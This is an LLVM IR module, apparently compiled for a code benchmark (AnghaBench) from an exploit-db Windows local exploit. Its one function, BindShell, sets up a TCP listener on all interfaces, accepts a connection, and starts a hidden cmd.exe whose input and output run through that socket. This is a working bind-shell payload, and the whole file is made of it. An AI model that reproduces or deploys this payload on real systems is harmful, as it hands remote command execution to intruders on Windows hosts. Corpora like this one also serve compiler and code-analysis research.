; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1197.c_BindShell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1197.c_BindShell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_8__ = type { i32, i32, i32, i8*, i8*, i8*, i32 }
%struct.sockaddr_in = type { %struct.TYPE_7__, i64, i32 }
%struct.TYPE_7__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i64 0, align 8
@HAXORCITOS = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i64 0, align 8
@SW_HIDE = common dso_local global i32 0, align 4
@STARTF_USESHOWWINDOW = common dso_local global i32 0, align 4
@STARTF_USESTDHANDLES = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"cmd.exe\00", align 1
@TRUE = common dso_local global i32 0, align 4
@INFINITE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"SALIMOS...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @BindShell() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca %struct.TYPE_8__, align 8
  %5 = alloca %struct.TYPE_8__, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca i32, align 4
  %9 = call i32 @MAKEWORD(i32 2, i32 2)
  %10 = call i64 @WSAStartup(i32 %9, i32* %6)
  %11 = icmp ne i64 %10, 0
  br i1 %11, label %12, label %14

12:                                               ; preds = %0
  %13 = call i32 @exit(i32 1) #3
  unreachable

14:                                               ; preds = %0
  %15 = load i32, i32* @AF_INET, align 4
  %16 = load i32, i32* @SOCK_STREAM, align 4
  %17 = load i32, i32* @IPPROTO_TCP, align 4
  %18 = call i64 @WSASocket(i32 %15, i32 %16, i32 %17, i32 0, i32 0, i32 0)
  store i64 %18, i64* %2, align 8
  %19 = load i64, i64* @INVALID_SOCKET, align 8
  %20 = icmp eq i64 %18, %19
  br i1 %20, label %21, label %23

21:                                               ; preds = %14
  %22 = call i32 @exit(i32 1) #3
  unreachable

23:                                               ; preds = %14
  %24 = load i32, i32* @AF_INET, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %24, i32* %25, align 8
  %26 = load i32, i32* @HAXORCITOS, align 4
  %27 = call i64 @htons(i32 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i64 %27, i64* %28, align 8
  %29 = load i32, i32* @INADDR_ANY, align 4
  %30 = call i32 @htonl(i32 %29)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %32 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %31, i32 0, i32 0
  store i32 %30, i32* %32, align 8
  store i32 24, i32* %8, align 4
  %33 = load i64, i64* %2, align 8
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %35 = call i64 @bind(i64 %33, %struct.sockaddr* %34, i32 24)
  %36 = load i64, i64* @SOCKET_ERROR, align 8
  %37 = icmp eq i64 %35, %36
  br i1 %37, label %38, label %39

38:                                               ; preds = %23
  store i32 -1, i32* %1, align 4
  br label %86

39:                                               ; preds = %23
  %40 = load i64, i64* %2, align 8
  %41 = call i64 @listen(i64 %40, i32 1)
  %42 = load i64, i64* @SOCKET_ERROR, align 8
  %43 = icmp eq i64 %41, %42
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  store i32 -1, i32* %1, align 4
  br label %86

45:                                               ; preds = %39
  %46 = load i64, i64* %2, align 8
  %47 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %48 = call i64 @accept(i64 %46, %struct.sockaddr* %47, i32* %8)
  store i64 %48, i64* %3, align 8
  %49 = load i64, i64* %2, align 8
  %50 = call i32 @closesocket(i64 %49)
  %51 = call i32 @ZeroMemory(%struct.TYPE_8__* %4, i32 48)
  %52 = call i32 @ZeroMemory(%struct.TYPE_8__* %5, i32 48)
  %53 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %4, i32 0, i32 0
  store i32 48, i32* %53, align 8
  %54 = load i32, i32* @SW_HIDE, align 4
  %55 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %4, i32 0, i32 6
  store i32 %54, i32* %55, align 8
  %56 = load i32, i32* @STARTF_USESHOWWINDOW, align 4
  %57 = load i32, i32* @STARTF_USESTDHANDLES, align 4
  %58 = or i32 %56, %57
  %59 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %4, i32 0, i32 1
  store i32 %58, i32* %59, align 4
  %60 = load i64, i64* %3, align 8
  %61 = inttoptr i64 %60 to i8*
  %62 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %4, i32 0, i32 5
  store i8* %61, i8** %62, align 8
  %63 = load i64, i64* %3, align 8
  %64 = inttoptr i64 %63 to i8*
  %65 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %4, i32 0, i32 4
  store i8* %64, i8** %65, align 8
  %66 = load i64, i64* %3, align 8
  %67 = inttoptr i64 %66 to i8*
  %68 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %4, i32 0, i32 3
  store i8* %67, i8** %68, align 8
  %69 = load i32, i32* @TRUE, align 4
  %70 = call i32 @CreateProcess(i32* null, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i32* null, i32* null, i32 %69, i32 0, i32* null, i32* null, %struct.TYPE_8__* %4, %struct.TYPE_8__* %5)
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %75, label %72

72:                                               ; preds = %45
  %73 = call i32 (...) @GetLastError()
  %74 = call i32 @doFormatMessage(i32 %73)
  store i32 -1, i32* %1, align 4
  br label %86

75:                                               ; preds = %45
  %76 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %5, i32 0, i32 2
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* @INFINITE, align 4
  %79 = call i32 @WaitForSingleObject(i32 %77, i32 %78)
  %80 = load i64, i64* %2, align 8
  %81 = call i32 @closesocket(i64 %80)
  %82 = load i64, i64* %3, align 8
  %83 = call i32 @closesocket(i64 %82)
  %84 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %85 = call i32 @Sleep(i32 5000)
  store i32 1, i32* %1, align 4
  br label %86

86:                                               ; preds = %75, %72, %44, %38
  %87 = load i32, i32* %1, align 4
  ret i32 %87
}

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @WSASocket(i32, i32, i32, i32, i32, i32) #1

declare dso_local i64 @htons(i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i64 @bind(i64, %struct.sockaddr*, i32) #1

declare dso_local i64 @listen(i64, i32) #1

declare dso_local i64 @accept(i64, %struct.sockaddr*, i32*) #1

declare dso_local i32 @closesocket(i64) #1

declare dso_local i32 @ZeroMemory(%struct.TYPE_8__*, i32) #1

declare dso_local i32 @CreateProcess(i32*, i8*, i32*, i32*, i32, i32, i32*, i32*, %struct.TYPE_8__*, %struct.TYPE_8__*) #1

declare dso_local i32 @doFormatMessage(i32) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @WaitForSingleObject(i32, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
